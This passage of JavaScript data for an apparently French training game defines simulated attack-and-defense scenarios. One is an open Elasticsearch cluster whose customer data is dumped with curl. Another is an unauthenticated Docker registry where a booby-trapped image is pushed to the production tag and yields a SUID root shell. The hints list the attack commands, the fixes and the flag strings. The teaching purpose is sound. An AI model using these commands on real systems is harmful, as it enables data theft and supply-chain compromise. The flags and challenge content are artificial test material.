    who:'Vous incarnez bob, un utilisateur ayant simplement accès au réseau de target-lab.',
    desc:"Le cluster Elasticsearch de target-lab écoute sur toutes les interfaces sans le module de sécurité activé. Exfiltrez les données clients qu'il contient.",
    hints:[
      "`curl http://target-lab:9200/_cat/indices?v` liste les index sans la moindre authentification, dont un index `customers` contenant des milliers de documents.",
      "`curl http://target-lab:9200/customers/_search?size=1000` retourne le contenu intégral de cet index, y compris des données personnelles et des identifiants."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Activez le module de sécurité d'Elasticsearch afin d'exiger une authentification.",
    hints:[
      "Éditez `/etc/elasticsearch/elasticsearch.yml` avec `nano` et ajoutez la ligne `xpack.security.enabled: true`.",
      "`verify` confirme que le cluster exige désormais une authentification."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['elasticsearch']},
      '/etc/elasticsearch':{type:'dir',perm:'755',owner:'root',children:['elasticsearch.yml']},
      '/etc/elasticsearch/elasticsearch.yml':{type:'file',perm:'644',owner:'root',size:90,
        content:"cluster.name: target-lab-cluster\nnetwork.host: 0.0.0.0\n# le module de securite n'est pas active pour l'instant\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/target-lab:9200\/_cat\/indices\?v$/, run(state, print){
        const secured = /xpack\.security\.enabled:\s*true/.test(state.vfs['/etc/elasticsearch/elasticsearch.yml'].content);
        if(secured){ print('401 Unauthorized: missing authentication credentials', 'err'); return; }
        print('health status index      docs.count', 'out');
        print('yellow open   customers  15000', 'out');
      }
    },
    { pattern:/^curl\s+http:\/\/target-lab:9200\/customers\/_search\?size=1000$/, run(state, print){
        const secured = /xpack\.security\.enabled:\s*true/.test(state.vfs['/etc/elasticsearch/elasticsearch.yml'].content);
        if(secured){ print('401 Unauthorized: missing authentication credentials', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.exfil = true;
        print('{"hits":[{"email":"client@target-lab.fr","carte":"4111-xxxx-xxxx-1234"}, ... ]}', 'out');
        print("[+] Données clients exfiltrées depuis un cluster Elasticsearch ouvert.", 'ok');
        print("FLAG{elasticsearch_sans_auth_exfiltration}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.exfil === true; },
  defenseCheck(state){ return /xpack\.security\.enabled:\s*true/.test(state.vfs['/etc/elasticsearch/elasticsearch.yml'].content); },
  replay(state){
    const log=[];
    const secured = /xpack\.security\.enabled:\s*true/.test(state.vfs['/etc/elasticsearch/elasticsearch.yml'].content);
    log.push({t:'$ curl http://target-lab:9200/_cat/indices?v', cls:'prompt-line'});
    if(secured){
      log.push({t:'401 Unauthorized: missing authentication credentials', cls:'err'});
      log.push({t:"[-] Le module de sécurité est activé : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'yellow open   customers  15000', cls:'ok'});
    log.push({t:'[+] Données clients exfiltrées.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 31. Registre Docker non authentifié ===================== */
{
  id:'docker-registry-unauthenticated',
  title:'Un registre Docker interne accessible sans authentification',
  category:"Chaîne d'approvisionnement (registre Docker non authentifié)",
  attack:{
    who:'Vous incarnez bob, un utilisateur ayant accès au réseau interne de target-lab.',
    desc:"Le registre Docker interne n'exige aucune authentification pour pousser une image. Publiez une image malveillante sous le tag de production : le pipeline de déploiement automatique la redéploiera avec des privilèges élevés.",
    hints:[
      "`curl http://registry.target-lab:5000/v2/_catalog` liste les dépôts du registre sans authentification : `prod-app` en fait partie.",
      "Vous avez déjà construit une image piégée en local (`evil-image`). `docker tag evil-image registry.target-lab:5000/prod-app:latest` puis `docker push registry.target-lab:5000/prod-app:latest` la publient sous le tag de production, sans qu'aucune vérification ne s'y oppose.",
      "`attendre-deploiement` simule le pipeline de déploiement continu qui redéploie automatiquement la dernière image du tag `latest`, avec des privilèges root.",
      "Terminez par `/tmp/rootbash -p` pour obtenir un shell root."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
    desc:"Exigez une authentification pour pousser des images vers le registre, sans bloquer les téléchargements légitimes.",
    hints:[
      "Éditez `/etc/docker/registry-config.yml` avec `nano` et ajoutez un bloc d'authentification `htpasswd` (`auth: htpasswd: realm: basic-realm path: /etc/docker/htpasswd`).",
      "`verify` confirme que le registre exige désormais une authentification."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['docker']},
      '/etc/docker':{type:'dir',perm:'755',owner:'root',children:['registry-config.yml']},
      '/etc/docker/registry-config.yml':{type:'file',perm:'644',owner:'root',size:120,
        content:"version: 0.1\nstorage:\n  filesystem:\n    rootdirectory: /var/lib/registry\nhttp:\n  addr: :5000\n# aucune authentification configuree pour l'instant\n"},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/registry\.target-lab:5000\/v2\/_catalog$/, run(state, print){
        const secured = /htpasswd/.test(state.vfs['/etc/docker/registry-config.yml'].content);
        if(secured){ print('401 Unauthorized', 'err'); return; }
        print('{"repositories":["prod-app","internal-tools"]}', 'out');
      }
    },
    { pattern:/^docker\s+tag\s+evil-image\s+registry\.target-lab:5000\/prod-app:latest$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.tagged = true;
        print('', 'out');
      }
    },
    { pattern:/^docker\s+push\s+registry\.target-lab:5000\/prod-app:latest$/, run(state, print){
        const secured = /htpasswd/.test(state.vfs['/etc/docker/registry-config.yml'].content);
        if(secured){ print('401 Unauthorized: authentication required', 'err'); return; }
        if(!state.flags || !state.flags.tagged){ print("docker: image 'registry.target-lab:5000/prod-app:latest' introuvable localement.", 'err'); return; }
        state.flags.pushed = true;
        print('The push refers to repository [registry.target-lab:5000/prod-app]', 'out');
        print('latest: digest: sha256:evil0123456789 size: 1234', 'ok');
      }
    },
    { pattern:/^attendre-deploiement$/, run(state, print){
        if(!state.flags || !state.flags.pushed){
          print("[pipeline] Aucune nouvelle image détectée sur le tag latest.", 'info');
          return;
        }
        print("[pipeline] Nouvelle image détectée sur prod-app:latest, redéploiement automatique...", 'info');
        state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
        if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
        print("[+] Image piégée déployée et exécutée avec les privilèges du pipeline (root).", 'ok');
        print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via une image malveillante poussée sur le registre.", 'ok');
          print("FLAG{registre_docker_sans_auth_supply_chain}", 'flagline');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return /htpasswd/.test(state.vfs['/etc/docker/registry-config.yml'].content); },
  replay(state){
    const log=[];
    const secured = /htpasswd/.test(state.vfs['/etc/docker/registry-config.yml'].content);
    log.push({t:'$ docker push registry.target-lab:5000/prod-app:latest', cls:'prompt-line'});
    if(secured){
      log.push({t:'401 Unauthorized: authentication required', cls:'err'});
      log.push({t:"[-] Le registre exige désormais une authentification : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'latest: digest: sha256:evil0123456789 size: 1234', cls:'ok'});
    log.push({t:'[+] Image malveillante redéployée automatiquement, shell root obtenu.', cls:'ok'});
    return {log, success:true};
  }
}

];
